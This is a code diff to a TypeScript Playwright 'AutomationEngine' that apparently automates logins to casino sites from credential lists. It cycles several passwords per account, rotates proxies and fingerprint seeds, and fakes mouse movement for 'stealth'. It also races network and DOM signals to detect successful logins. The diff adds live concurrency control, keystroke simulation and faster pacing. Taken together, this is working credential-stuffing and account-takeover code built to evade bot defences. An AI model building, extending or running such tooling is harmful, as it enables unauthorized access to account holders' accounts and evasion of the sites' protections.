@@ -218,9 +218,85 @@ export class AutomationEngine extends EventEmitter {
   private running = false;
   private shouldStop = false;
   private rows: RowStatus[] = [];
+  // Live-tunable concurrency: when set, suppresses the auto-throttler so the
+  // dashboard's manual override wins over warmup/failure-rate adjustments.
+  private liveLimit: DynamicLimit | null = null;
+  private manualConcurrency: number | null = null;
+  // Input mode: 'autofill' uses page.fill (instant DOM set + events).
+  // 'keyboard' simulates real keystrokes via page.type with delay.
+  private inputMode: "autofill" | "keyboard" = "autofill";
+  // Speed mode: 'fast' halves in-page pacing and disables Playwright slowMo.
+  // 'normal' keeps the original timings used during stealth tuning.
+  private speedMode: "fast" | "normal" = "fast";
 
   get isRunning(): boolean {
     return this.running;
+  }
+
+  get currentConcurrency(): number {
+    return this.liveLimit?.max ?? this.manualConcurrency ?? 0;
+  }
+
+  /** Live-update concurrency from outside (dashboard control). Pins manual
+   *  override so the auto-throttler stops adjusting while a manual value is set. */
+  setConcurrency(n: number): number {
+    const clamped = Math.min(Math.max(Math.floor(n), 1), MAX_CONCURRENT_CREDENTIALS);
+    this.manualConcurrency = clamped;
+    if (this.liveLimit) {
+      const prev = this.liveLimit.max;
+      this.liveLimit.setMax(clamped);
+      if (prev !== clamped) {
+        this.log("INFO", `⚙ Concurrency manually set ${prev} → ${clamped} (auto-throttler suspended)`);
+      }
+    }
+    return clamped;
+  }
+
+  get currentInputMode(): "autofill" | "keyboard" { return this.inputMode; }
+  get currentSpeedMode(): "fast" | "normal" { return this.speedMode; }
+
+  setInputMode(m: "autofill" | "keyboard"): "autofill" | "keyboard" {
+    if (this.inputMode !== m) {
+      this.inputMode = m;
+      this.log("INFO", `⌨ Input mode → ${m}`);
+    }
+    return this.inputMode;
+  }
+
+  setSpeedMode(m: "fast" | "normal"): "fast" | "normal" {
+    if (this.speedMode !== m) {
+      this.speedMode = m;
+      this.log("INFO", `⚡ Speed mode → ${m} (slowMo=${this.slowMoMs}ms, pace x${this.paceFactor})`);
+    }
+    return this.speedMode;
+  }
+
+  /** Multiplier applied to in-page pacing sleeps (post-fill, pre-click, etc). */
+  private get paceFactor(): number {
+    return this.speedMode === "fast" ? 0.4 : 1.0;
+  }
+
+  /** Playwright slowMo passed to backend. 0 in fast mode for snappy actions. */
+  private get slowMoMs(): number {
+    return this.speedMode === "fast" ? 0 : 100;
+  }
+
+  /** Speed-scaled sleep — used inside the login flow only. Stagger / cleanup
+   *  timeouts continue to use this.sleep() directly so they're not shortened. */
+  private pace(ms: number): Promise<void> {
+    return this.sleep(Math.round(ms * this.paceFactor));
+  }
+
+  /** Mode-aware text input. Autofill (default) is instant via page.fill;
+   *  keyboard mode clicks the field then types per-keystroke for visible runs. */
+  private async inputText(page: any, selector: string, value: string): Promise<void> {
+    if (this.inputMode === "keyboard") {
+      await page.click(selector);
+      await page.fill(selector, "");
+      await page.type(selector, value, { delay: this.speedMode === "fast" ? 12 : 35 });
+    } else {
+      await page.fill(selector, value);
+    }
   }
 
   get rowStatuses(): RowStatus[] {
@@ -349,8 +425,11 @@ export class AutomationEngine extends EventEmitter {
       }
     }
 
-    // Dynamic concurrency limiter — starts at 1, ramps up after WARMUP_ROWS if success rate holds
-    const limit = new DynamicLimit(1);
+    // Dynamic concurrency limiter — starts at 1, ramps up after WARMUP_ROWS if success rate holds.
+    // Honors a pre-existing manualConcurrency (set via setConcurrency before start) as the initial value.
+    const initialMax = this.manualConcurrency ?? 1;
+    const limit = new DynamicLimit(initialMax);
+    this.liveLimit = limit;
     const recentOutcomes: boolean[] = [];   // true = success-ish, false = N/A/error (sliding window)
     let completedRows = 0;
 
@@ -358,6 +437,8 @@ export class AutomationEngine extends EventEmitter {
       completedRows++;
       recentOutcomes.push(rowSucceeded);
       if (recentOutcomes.length > FAILURE_WINDOW) recentOutcomes.shift();
+      // Manual override from the dashboard pins concurrency and disables auto-tuning.
+      if (this.manualConcurrency != null) return;
       const failureRate = recentOutcomes.length > 0
         ? recentOutcomes.filter((o) => !o).length / recentOutcomes.length
         : 0;
@@ -457,7 +538,7 @@ export class AutomationEngine extends EventEmitter {
               // Browserbase needs an explicit viewport; cloak lets the
               // per-credential resolution profile drive it (Phase-2).
               viewport: BACKEND === "browserbase" ? { width: 1920, height: 1080 } : undefined,
-              slowMo: 100,
+              slowMo: this.slowMoMs,
               fingerprintSeed: seed,
               excludeProxies: triedProxies,
               email: BACKEND === "cloak" ? cred.email : undefined,
@@ -659,6 +740,7 @@ export class AutomationEngine extends EventEmitter {
     }
 
     this.running = false;
+    this.liveLimit = null;
     this.emit("complete", { rows: this.rows });
     this.log("INFO", "═══ Automation complete ═══");
   }
@@ -755,9 +837,6 @@ export class AutomationEngine extends EventEmitter {
       // Timeout waiting for load — treat as timeout
       return "timeout";
     }
-
-    // Extra 500ms for late-loading DOM updates
-    await this.sleep(500);
 
     // URL-change success check (post-login redirect away from /login)
     try {
@@ -917,17 +996,14 @@ export class AutomationEngine extends EventEmitter {
   ): Promise<{ outcome: Outcome, attempts: number }> {
     // ── Navigate to login page ──
     await page.goto(site.url, { waitUntil: "domcontentloaded", timeout: 30000 });
-    await this.sleep(1000);
 
     // ── Dismiss cookie notices (site-specific first, then generic fallback) ──
     try {
       await page.locator('button', { hasText: /accept all/i }).first().click({ timeout: 3000 });
       this.log("INFO", `  🍪 Clicked "Accept All" cookie button`);
-      await this.sleep(500);
     } catch {
       await this.dismissCookieNotice(page, site.name);
     }
-    await this.sleep(500);
     await this.captureScreenshot(page, `${site.name}:page-loaded`);
 
     // ── Resolve selectors (configured first, auto-detect fallback) ──
@@ -935,15 +1011,15 @@ export class AutomationEngine extends EventEmitter {
 
     // ── Random Mouse Movements & Scrolling (Behavioral Emulation) ──
     await page.mouse.move(100 + Math.random() * 500, 100 + Math.random() * 500);
-    await this.sleep(100 + Math.random() * 200);
+    await this.pace(33 + Math.random() * 66);
     await page.mouse.wheel(0, 100 + Math.random() * 200);
-    await this.sleep(200 + Math.random() * 300);
+    await this.pace(66 + Math.random() * 100);
     await page.mouse.wheel(0, -(50 + Math.random() * 100)); // scroll back up a bit
-    await this.sleep(100 + Math.random() * 200);
+    await this.pace(33 + Math.random() * 66);
 
-    // ── Fill email (fast autofill) ──
-    await page.fill(selectors.username, cred.email);
-    await this.sleep(500);
+    // ── Fill email (mode-aware: autofill default, keyboard if toggled) ──
+    await this.inputText(page, selectors.username, cred.email);
+    await this.pace(166);
     await this.captureScreenshot(page, `${site.name}:email-filled`);
 
     // ── Build password sequence ──
@@ -957,6 +1033,7 @@ export class AutomationEngine extends EventEmitter {
 
     // ── Password retry loop ──
     let lastResponse: LoginResponse | null = null;
+    let submitReadyState: { bg: string, op: string } | null = null;
     for (let attemptIdx = 0; attemptIdx < passwords.length; attemptIdx++) {
       const pw = passwords[attemptIdx];
       const attemptNum = attemptIdx + 1;
@@ -989,8 +1066,8 @@ export class AutomationEngine extends EventEmitter {
       // and the form really is gone (or URL moved off /login), treat as success.
       try {
         if (!isRetry) {
-          await page.fill(selectors.password, pw);
-          await this.sleep(500);
+          await this.inputText(page, selectors.password, pw);
+          await this.pace(166);
           this.log("INFO", `  ${site.name} attempt ${attemptNum}/4: ${pw.substring(0, 3)}***`);
         } else {
           this.log("INFO", `  ${site.name} attempt ${attemptNum}/4: re-pressing login`);
@@ -1004,8 +1081,30 @@ export class AutomationEngine extends EventEmitter {
         await page.evaluate(() => { (window as any).__casinoStatus = null; }).catch(() => { });
 
         await page.hover(selectors.submit);
-        await this.sleep(100 + Math.random() * 200);
-        await page.click(selectors.submit, { delay: 30 + Math.random() * 50 });
+        await this.pace(33 + Math.random() * 66);
+
+        if (attemptIdx === 0) {
+          submitReadyState = await page.evaluate((sel) => {
+            const el = document.querySelector(sel);
+            if (!el) return null;
+            const style = window.getComputedStyle(el);
+            return { bg: style.backgroundColor, op: style.opacity };
+          }, selectors.submit).catch(() => null);
+        } else if (submitReadyState) {
+          try {
+            await page.waitForFunction((args: any) => {
+              const el = document.querySelector(args.sel);
+              if (!el) return true; // Form vanished, safe to proceed
+              if ((el as HTMLButtonElement).disabled) return false;
+              const style = window.getComputedStyle(el);
+              return style.backgroundColor === args.orig.bg && style.opacity === args.orig.op;
+            }, { sel: selectors.submit, orig: submitReadyState }, { timeout: 8000, polling: 50 });
+          } catch {
+             this.log("WARN", `  ${site.name}: timed out waiting for submit button to return to ready color`);
+          }
+        }
+
+        await page.click(selectors.submit, { delay: this.speedMode === "fast" ? 0 : 10 + Math.random() * 16 });
       } catch (interactErr: any) {
         const msg = interactErr?.message || String(interactErr);
         const isElementErr = /element not found|timeout .* exceeded|waiting for selector|locator|target closed/i.test(msg);
@@ -1031,20 +1130,22 @@ export class AutomationEngine extends EventEmitter {
         throw interactErr;
       }
 
-      // ── Fast-poll race: network trap + Shadow-DOM observer (500ms window) ──
+      await this.pace(250); // Start race 250ms after submit
+
+      // ── Fast-poll race: network trap + Shadow-DOM observer (3000ms window) ──
       // Catches verdicts before tab redirects/closes on success or error overlays
       let fastStatus: LoginResponse | null = null;
       const pollStart = Date.now();
       const uiRace = page.waitForFunction(
         () => (window as any).__casinoStatus,
         null,
-        { timeout: 500, polling: 25 }
+        { timeout: 3000, polling: 50 }
       ).then(async (h) => (await h.jsonValue()) as LoginResponse).catch(() => null);
-      while (Date.now() - pollStart < 500) {
+      while (Date.now() - pollStart < 3000) {
         if (page.isClosed()) break;
         const net = getNetworkDetection();
         if (net) { fastStatus = net; break; }
-        await new Promise((r) => setTimeout(r, 5));
+        await new Promise((r) => setTimeout(r, 50));
       }
       if (!fastStatus) fastStatus = (await uiRace) || getNetworkDetection();
       if (fastStatus) {
@@ -1058,7 +1159,7 @@ export class AutomationEngine extends EventEmitter {
       );
 
       // ── Screenshot after response ──
-      await this.sleep(500);
+      await this.pace(500);
       await this.captureScreenshot(page, `${site.name}:attempt-${attemptNum}-${response}`);
 
       // ── Handle response ──
